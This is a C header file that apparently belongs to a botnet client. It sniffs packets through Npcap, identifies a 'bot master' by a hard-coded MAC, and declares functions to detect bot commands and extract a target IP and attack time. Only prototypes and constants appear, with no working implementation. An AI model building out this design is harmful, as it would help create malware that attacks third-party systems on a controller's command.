#pragma once
#include <stdbool.h>
#include <pcap/pcap.h>
#define DEBUG

#define NPCAP_ERROR printf("NPCAP error message: \"%s\"\n", errbuff);

static char errbuff[PCAP_ERRBUF_SIZE];
static const char* adapter_id = "\\Device\\NPF_{EE28EB53-E495-4860-BBC4-3E6F22BFA910}";
static const u_char bot_master_mac[6] = {'b', 'o', 't', 'n', 'e', 't'};

void print_availiable();
bool is_adapter_availiable(const char* adapter);
void handle_packets(u_char* user, const struct pcap_pkthdr *h, const u_char *bytes);
_Bool is_bot_command(const u_char *packet);
void extract_attack_info(const u_char *packet, u_char *target_ip, u_char *attack_time);
